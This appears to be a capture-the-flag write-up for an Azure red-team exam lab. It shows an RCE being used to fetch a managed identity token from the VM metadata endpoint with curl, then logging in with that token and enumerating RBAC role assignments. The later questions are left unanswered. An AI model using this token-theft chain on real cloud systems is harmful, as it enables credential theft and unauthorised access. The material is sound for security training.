# Azure Cloud Red Teaming

## 1. What is the subdomain of “meta-tech.cloud” organisation which hosted app on azure vm?
- Visit https://urlscan.io/search/#meta-tech.cloud and found the subdomain `internal.meta-tech.cloud`
![alt text](1.png)

> Answer: internal

## 2. What is the “iss” claim in JWT token of vm metadata?
- Follow the IP address of the subdomain
![alt text](2.png)
- This website contains a RCE vulnerability at:
![alt text](3.png)
![alt text](4.png)
- Exploit this vulnerability to retrieve the access token of managed identity attached to the VM:
```sh
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?resource=https://management.azure.com&api-version=2019-02-01"
```
![alt text](5.png)
- Decode the access token and read the `iss` field:
![alt text](6.png)

> Answer: https://sts.windows.net/68b40a4c-50f1-48f3-b7cb-916dd82418a7/

## 3. What is the tenant id of the organization?
- Read the `tid` field from the above decoded access token

> Answer: 68b40a4c-50f1-48f3-b7cb-916dd82418a7

## 4. What is the Subscription ID where the vulnerable app is hosted on VM?
- Reuse the RCE to look up the instance's metadata (http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01) and read the `subscriptionId` field:
![alt text](7.png)
## 5. What is the subscription level role assigned to identity attached to compromised vm?
- Login with the access token to the tenant `68b40a4c-50f1-48f3-b7cb-916dd82418a7`:
```pwsh
Connect-AzAccount -AccessToken "xxx" -AccountId "68b40a4c-50f1-48f3-b7cb-916dd82418a7"

Subscription name Tenant
----------------- ------
MCRTA-Exam        68b40a4c-50f1-48f3-b7cb-916dd82418a7
```
- Use the `oid` value obtained from the decoded JWT and query all Azure RBAC role assignments for the specific identity (which is the compromised VM):
```pwsh
Get-AzRoleAssignment -ObjectId "3c19c764-a8dd-492d-bae8-0b2146630ab1"

RoleAssignmentName : 27c7fe8d-5bd7-d729-d65f-5c477c343c4e
RoleAssignmentId   : /subscriptions/4ebaca3d-8642-4a01-b544-e62550598323/providers/Microsoft.Authorization/roleAssignme
                     nts/27c7fe8d-5bd7-d729-d65f-5c477c343c4e
Scope              : /subscriptions/4ebaca3d-8642-4a01-b544-e62550598323
DisplayName        :
SignInName         :
RoleDefinitionName : Reader
RoleDefinitionId   : acdd72a7-3385-48ef-bd42-f606fba81ae7
ObjectId           : 3c19c764-a8dd-492d-bae8-0b2146630ab1
ObjectType         : ServicePrincipal
CanDelegate        : False
Description        :
ConditionVersion   :
Condition          :
```

> Answer: Reader

## 6. What is the scope where “custom-role-definition” role is assigned?

- List all Azure RBAC roles: 
```pwsh
Get-AzRoleAssignment
<SNIP>
RoleAssignmentName : 54599177-0872-fa0e-9f7a-f7fce3716a6c
RoleAssignmentId   : /subscriptions/4ebaca3d-8642-4a01-b544-e62550598323/resourceGroups/IT-RG/providers/Microsoft.Compu
                     te/virtualMachines/it-vm/providers/Microsoft.Authorization/roleAssignments/54599177-0872-fa0e-9f7a
                     -f7fce3716a6c
Scope              : /subscriptions/4ebaca3d-8642-4a01-b544-e62550598323/resourceGroups/IT-RG/providers/Microsoft.Compu
                     te/virtualMachines/it-vm
DisplayName        :
SignInName         :
RoleDefinitionName : custom-role-definition
RoleDefinitionId   : 3073a810-518a-273e-97d6-c30abcf852cd
ObjectId           : 796afff8-eb75-4b59-b466-f45267140514
ObjectType         : Group
CanDelegate        : False
Description        :
ConditionVersion   :
Condition          :
<SNIP>
```

> Answer: /subscriptions/4ebaca3d-8642-4a01-b544-e62550598323/resourceGroups/IT-RG/providers/Microsoft.Compute/virtualMachines/it-vm
## 7. Name of the actions allowed in “custom-role-definition” role?
    

## 8. What is the email id of user which is member of “IT Ops” Group?
## 9. What is the display name of user which is owner of “prod-app” application?
## 10. What is the microsoft graph api permission assigned to “dev-app” application?